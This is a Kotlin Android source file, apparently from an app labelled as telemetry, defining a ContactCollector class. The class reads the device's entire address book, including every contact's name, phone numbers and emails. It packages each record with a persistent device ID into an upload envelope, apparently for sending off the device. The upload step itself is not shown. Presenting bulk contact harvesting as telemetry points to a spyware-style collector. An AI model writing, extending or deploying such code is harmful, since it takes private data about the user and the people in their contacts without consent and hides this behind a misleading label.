package com.pulsedrop.telemetry.collectors

import android.content.Context
import android.provider.ContactsContract
import com.pulsedrop.telemetry.data.ContactEntry
import com.pulsedrop.telemetry.data.UploadEnvelope
import com.pulsedrop.telemetry.utils.PrefsManager

class ContactCollector(
    private val context: Context,
    private val onData: (UploadEnvelope) -> Unit
) {
    private val prefs = PrefsManager(context)

    fun collectAll() {
        val projection = arrayOf(
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME
        )

        context.contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            projection, null, null, null
        )?.use { cursor ->
            val idIdx = cursor.getColumnIndex(ContactsContract.Contacts._ID)
            val nameIdx = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)

            while (cursor.moveToNext()) {
                val contactId = cursor.getString(idIdx)
                val name = cursor.getString(nameIdx) ?: ""

                val phones = getPhones(contactId)
                val emails = getEmails(contactId)

                val entry = ContactEntry(
                    id = contactId,
                    name = name,
                    phoneNumbers = phones,
                    emails = emails
                )
                onData(UploadEnvelope("contact", prefs.deviceId, System.currentTimeMillis(), entry))
            }
        }
    }

    private fun getPhones(contactId: String): List<String> {
        val phones = mutableListOf<String>()
        context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
            arrayOf(contactId), null
        )?.use { c ->
            val idx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (c.moveToNext()) c.getString(idx)?.let { phones.add(it) }
        }
        return phones
    }

    private fun getEmails(contactId: String): List<String> {
        val emails = mutableListOf<String>()
        context.contentResolver.query(
            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Email.ADDRESS),
            "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
            arrayOf(contactId), null
        )?.use { c ->
            val idx = c.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
            while (c.moveToNext()) c.getString(idx)?.let { emails.add(it) }
        }
        return emails
    }
}
